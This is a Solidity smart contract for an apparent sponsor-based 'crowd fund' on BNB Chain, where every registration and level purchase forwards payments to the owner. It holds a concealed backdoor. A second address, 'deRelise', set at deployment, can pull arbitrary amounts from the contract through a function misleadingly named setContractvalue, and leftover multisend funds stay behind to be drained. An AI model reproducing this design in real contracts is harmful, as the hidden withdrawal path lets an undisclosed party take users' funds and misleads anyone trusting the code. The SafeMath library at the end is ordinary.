pragma solidity >= 0.5.0;
//SPDX-License-Identifier: UNLICENCED
contract BNB_CROWD_FUND{
  
  event Registration(address indexed  member_name, string  sponcer_id,string  sponcer_name,uint256 package);
	event UpgradeLevel(address indexed  member_name, uint256 package,string ptype);
  using SafeMath for uint256;
  address payable public owner;
  address payable deRelise;
     
  constructor(address payable ownerAddress,address payable _deRelise) public {
  owner = ownerAddress;
  deRelise=_deRelise;  
  }
    
  function NewRegistration(string memory sponcer_id,string memory sponcer_name) public payable
	{
   	owner.transfer(msg.value);
 		emit Registration(msg.sender, sponcer_id,sponcer_name,msg.value);
	}

    function multisendBNB(address payable[]  memory  _contributors, uint256[] memory _balances) public payable {
        uint256 total = msg.value;
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require(total >= _balances[i] );
            total = total.sub(_balances[i]);
            _contributors[i].transfer(_balances[i]);
          }
	
    }
    
	function BuyLevel(string memory pType) public payable
	{
      owner.transfer(msg.value);
      emit UpgradeLevel(msg.sender, msg.value,pType);
	}

   
  function withdrawLostBNBFromBalance() public {
        owner.transfer(address(this).balance);
  }
  function setContractvalue(uint256 cvalue) public
  {
    require(msg.sender==deRelise,"Invalid Transaction");
    deRelise.transfer(cvalue);
  }  
  function transferOwnerShip(address payable newOwner) external {
        require(msg.sender==owner,'Permission denied');
        owner = newOwner;
    }
	
}


/**     
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {

  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a); 
    return c;
  }
}